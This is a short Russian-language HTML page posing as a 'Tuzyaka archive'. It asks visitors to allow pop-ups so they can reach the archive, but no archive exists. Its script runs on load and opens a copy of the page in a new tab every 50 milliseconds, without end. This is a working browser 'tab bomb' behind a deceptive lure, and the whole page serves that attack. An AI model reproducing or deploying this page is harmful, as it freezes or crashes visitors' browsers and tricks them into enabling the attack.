<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Tuzyaka archive</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 40%;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #0f0;
        }
        p {
            font-size: 1.5em;
            color: #f00;
            text-shadow: 0 0 5px #f00;
        }
    </style>
</head>
<body>
    <h1>Tuzyaka archive</h1>
    <p>Дайте доступ к архиву, разрешив всплывающие окна</p>

    <script>
        // Бесконечные попытки открытия новых вкладок
        function tryOpenTab() {
            window.open(window.location.href, '_blank');
            setTimeout(tryOpenTab, 50); // Пытаемся открывать каждые 50 мс
        }

        // Запуск при загрузке страницы
        tryOpenTab();
    </script>
</body>
</html>
